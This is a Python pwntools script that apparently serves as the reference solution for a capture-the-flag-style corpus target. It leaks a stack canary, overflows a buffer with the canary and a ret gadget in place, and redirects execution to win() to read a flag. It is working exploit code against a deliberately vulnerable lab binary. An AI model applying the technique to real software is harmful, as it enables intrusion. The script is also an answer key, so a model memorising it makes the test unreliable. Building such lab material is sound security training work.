#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
04_canary_relay_bypass.

Technique: leak the canary indirectly through a relay buffer, then
overflow again with the recovered canary in place to redirect to win().

Layout (confirmed via objdump -d --disassemble=vuln): buf sits at rbp-0x50
(64 bytes), the canary at rbp-0x8. There is an 8-byte compiler-inserted
alignment gap between them (buf's end, rbp-0x10, is NOT adjacent to the
canary) -- the canary is 72 bytes past buf's start, not 64. Saved rbp
follows the canary (8 bytes), then the return address, for a total
88-byte offset to the saved return address (confirmed by cyclic pattern
+ corefile).

Run directly:
    python3 04_canary_relay_bypass_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "04_canary_relay_bypass")
BINARY = os.path.join(TARGET_DIR, "canary_relay_bypass")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"


def exploit():
    elf = ELF(BINARY, checksec=False)
    io = process(elf.path, cwd=TARGET_DIR)

    io.recvuntil(b"Name: ")
    io.send(b"A" * 64)  # fills buf exactly to the alignment-gap boundary

    io.recvuntil(b"Relay: ")
    canary = io.recvn(8)  # raw 8-byte canary, relayed through relay_buf

    # A `ret`-based return-address overwrite lands the callee 8 bytes off
    # the ABI-mandated 16-byte stack alignment (a `ret` doesn't do the
    # extra push a real `call` would), which was harmless for a bare
    # puts() but faults inside fopen()'s internal malloc() (SIMD-aligned
    # code) now that win() reads flag.txt at runtime. One extra `ret`
    # gadget (the tail of win() itself, "leave; ret") consumes one more
    # 8-byte stack slot and restores correct alignment before actually
    # landing in win().
    ret_fixer = elf.symbols["win"] + (0x4013c3 - 0x40138d)

    io.recvuntil(b"Message: ")
    payload = b"B" * 64        # buf
    payload += b"G" * 8        # 8-byte alignment gap: uninspected, any value
    payload += canary          # recovered canary, must match exactly
    payload += b"R" * 8        # saved rbp: uninspected, any value
    payload += p64(ret_fixer)
    payload += p64(elf.symbols["win"])
    io.send(payload)

    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 04_canary_relay_bypass: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
